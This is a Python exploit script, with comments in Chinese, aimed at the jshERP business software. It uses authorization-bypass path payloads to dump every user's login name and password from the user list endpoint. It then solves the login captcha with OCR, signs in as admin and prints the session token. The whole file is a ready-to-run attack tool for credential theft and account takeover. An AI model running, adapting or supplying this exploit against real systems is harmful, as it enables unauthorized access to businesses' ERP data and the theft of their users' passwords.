#!/usr/bin/env python3
#author: xazlsec
# jshErp 越权查看所有用户信息

import time
import json
import sys
import base64
import ddddocr
import requests
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait

cdpath = r'bin/chromedriver.exe'

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
}

#获取验证码
def get_code(site):
    url = site + "/jshERP-boot/user/randomImage"
    datainfo = requests.get(url, headers=headers, verify=False).json()
    imgb64data = datainfo["data"]["base64"].replace('data:image/jpg;base64,','')
    uuid = datainfo["data"]["uuid"]
    imgdata = base64.b64decode(imgb64data)
    ocr = ddddocr.DdddOcr(show_ad=False)
    code = ocr.classification(imgdata)
    return code, uuid

#获取用户信息
def get_user_info(url):
    datainfo = requests.get(url, headers=headers, verify=False).json()
    userinfo = []
    if datainfo["code"] == 200:
        print("[+]获取到的用户信息如下：")
        for info in datainfo["data"]["userList"]:
            print((info["username"], info["loginName"], info["password"]))
            if len(userinfo) == 0:
                userinfo = info["username"], info["loginName"], info["password"]
            if info["username"] == "admin":
                userinfo = info["username"], info["loginName"], info["password"]
    return userinfo
    
#尝试登录，获取 token
def get_token(site, username, password):
    code = "1234"
    uuid = "856f7b4ef8a541d79604867cda8e243d"
    try:
        code, uuid = get_code(site)
    except:
        pass
    url = site + "/jshERP-boot/user/login"
    postdata={"code": code, "loginName": username, "password": password, "uuid": uuid}
    datainfo = requests.post(url, headers=headers, json=postdata, verify=False).json()
    
    if datainfo["code"] == 200:
        print("[+]认证成功，用户信息：", datainfo)
        return datainfo["data"]["token"]
    return  ""

def verify(site):
    payloads = ["/jshERP-boot/platformConfig/getPlatform/..;/..;/..;/jshERP-boot/user/getAllList", "/jshERP-boot/user/getAllList;.ico"]
    
    for payload in payloads:
        url = site + payload
        userinfo = get_user_info(url)
        if len(userinfo) != 0:
            #尝试使用 admin 的密码登录验证
            token = get_token(site, userinfo[1], userinfo[2])
            if token != "":
                print("[+]获取到的 Token 值为：", token)
                break
    
if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 jsherp-login-bypass-infoleak.py ",target)
    verify(target)
